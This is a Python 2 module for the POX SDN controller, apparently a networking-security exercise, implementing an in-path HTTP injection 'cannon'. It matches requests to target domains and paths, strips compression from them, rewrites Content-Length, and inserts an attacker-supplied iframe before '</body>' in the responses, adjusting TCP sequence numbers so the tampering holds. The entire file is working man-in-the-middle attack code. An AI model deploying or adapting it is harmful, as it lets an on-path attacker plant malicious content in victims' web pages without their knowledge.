from pox.lib.packet.ipv4 import ipv4
import re
from collections import defaultdict

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url


        self.req_dict = defaultdict(lambda: defaultdict(int))
        self.resp_dict = defaultdict(lambda: defaultdict(int))
        self.port_num = 0
        self.ip_port = defaultdict(list)

    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
	# print "tcp_payload = ", ip_packet.payload
	ip_payload = ip_packet.payload
	# print "ip_payload = ", ip_payload
        http_packet = ip_payload.payload
	if (ip_packet.protocol == 6 and http_packet): # assure the ip protocol is tcp
            # RESPONSES
            if self.req_dict[ip_packet.srcip][ip_packet.payload.dstport] or ip_packet.payload.dstport in self.ip_port[ip_packet.srcip]:

                og_len = len(http_packet)
                new_http = self.reform_resp(http_packet, ip_packet.dstip) # reform
 
                ip_packet.payload.payload = ip_packet.payload.payload.replace(ip_packet.payload.payload, new_http) # set payload
                ip_packet.payload.hdr(new_http) # tcp header 
                ip_packet.hdr(ip_packet.payload) # ip header
                ip_packet.payload.ack = ip_packet.payload.ack - self.req_dict[ip_packet.srcip][ip_packet.payload.dstport] # Changing seq and ack
                ip_packet.payload.seq = ip_packet.payload.seq + self.resp_dict[ip_packet.srcip][ip_packet.payload.dstport]
                self.resp_dict[ip_packet.srcip][ip_packet.payload.dstport]+= len(new_http) - og_len

            # REQUESTS
            else:
                # Attain domain and URL
                path,dom = self.extract_url(http_packet)

                if path and dom: # ie the packet is not a response
                    path_match,dom_match = self.is_cand(path,dom)
                    if path_match and dom_match:

                        og_len = len(http_packet)
                        new_http = self.reform_req(ip_packet, ip_packet.dstip)
                        ip_packet.payload.payload = ip_packet.payload.payload.replace(ip_packet.payload.payload, new_http) 
                        ip_packet.payload.hdr(new_http)
                        ip_packet.hdr(ip_packet.payload) 
                        if self.resp_dict[ip_packet.dstip][ip_packet.payload.srcport] or ip_packet.payload.srcport in self.ip_port[ip_packet.dstip]:
  
                            ip_packet.payload.ack = ip_packet.payload.ack - self.resp_dict[ip_packet.dstip][ip_packet.payload.srcport]
                            ip_packet.payload.seq = ip_packet.payload.seq + self.req_dict[ip_packet.dstip][ip_packet.payload.srcport]
                        self.req_dict[ip_packet.dstip][ip_packet.payload.srcport]+= len(new_http) - og_len
        return ip_packet

    def extract_url(self,packet):
        path = []
        dom = []
        parsed = 0
        for i in range(len(packet)):
            if parsed: break 
		
            if packet[i:i+4] == "GET ": 
                for j in range(i+4, len(packet)):
                    if packet[j] == " ":
                        break
                    path.append(packet[j])
            if packet[i:i+6] == "Host: ":
                for j in range(i+6, len(packet)):
                    if packet[j] == "\r" and packet[j+1] == "\n":
                       parsed = 1
                       break
                    dom.append(packet[j]) 
        return path,dom

    def is_cand(self,path, dom):
        c_path = []
        c_dom = []
        if path and dom: 

            if path[-1] == "/":
                c_path = path[0:-1]
            else:
                c_path = path
            if dom[-1] == "/":
                c_dom = dom[0:-1]
            else:
                c_dom = dom
                
            
            path_match = re.search(self.url_path_re, ''.join(c_path))
            dom_match = re.search(self.target_domain_re, ''.join(c_dom))
            return path_match, dom_match
    
    def reform_req(self, ip_packet, dstip):
        new_req = []
        i = 0
        packet = ip_packet.payload.payload
        # self.req_dict[dstip] = 0
        while i < len(packet):
            new_req.append(packet[i])
            if packet[i:i+17] == "Accept-Encoding: ":
                new_req.append("ccept-Encoding: identity")
                for j in range(i+17, len(packet)):
                    if packet[j] == "\r" and packet[j+1] == "\n":                        
                        diff = j - i - 25 # j - length of Accept-Encoding: identity
                        new_req.append("\r\n")    
                        i = j + 1
                        break                    
            i+=1
        self.ip_port[dstip].append(ip_packet.payload.srcport)
        return ''.join(new_req)        

    def reform_resp(self, packet, dstip):
        new_resp = []
        i = 0
        while i < len(packet):
            new_resp.append(packet[i])
            if packet[i:i+16] == "Content-Length: ":
                orig_len = []
                for k in range(i+16, len(packet)):
                    if packet[k] == "\r" and packet[k+1] == "\n":
                        break
                    orig_len.append(packet[k])
                # print ''.join(orig_len)
                new_length = int(''.join(orig_len)) + 24 + len(self.iframe_url)
                new_resp.append(("ontent-Length: " + str(new_length) + "\r\n"))
                for j in range(i, len(packet)):
                    if packet[j] == "\r" and packet[j+1] == "\n":
                        i = j + 1
                        break                    
            if packet[i:i+7] == "</body>":
                del new_resp[-1]
                mal_str = '<iframe src="' + self.iframe_url + '"></iframe>'
                new_resp.append(mal_str)
                new_resp.append('<') 
            i+=1
        return ''.join(new_resp)        

